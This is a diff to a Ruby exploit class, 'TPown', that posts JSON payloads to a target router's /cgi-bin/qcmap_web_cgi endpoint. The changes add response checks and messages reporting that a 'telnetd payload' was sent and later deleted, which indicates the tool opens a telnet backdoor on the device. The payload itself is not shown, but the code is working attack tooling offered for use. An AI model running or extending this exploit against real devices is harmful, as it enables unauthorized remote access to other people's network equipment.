@@ -139,7 +139,12 @@ class TPown
         res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_data) do |http|
             http.headers["Content-Type"] = "application/json"
         end
-        p res.body
+        data = JSON.parse(res.body)
+        if data["result"] != 0
+            raise "Error setting up payload?"
+        end
+
+        puts "[ok] Sent telnetd payload v1"
        
 
     
@@ -156,7 +161,12 @@ class TPown
         res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_del) do |http|
             http.headers["Content-Type"] = "application/json"
         end
-        p res.body
+        data = JSON.parse(res.body)
+        if data["result"] != 0
+            puts "Error deleting payload - may be safe to ignore"
+        else 
+            puts "[ok] Deleted payload v1"
+        end
     end
 
 
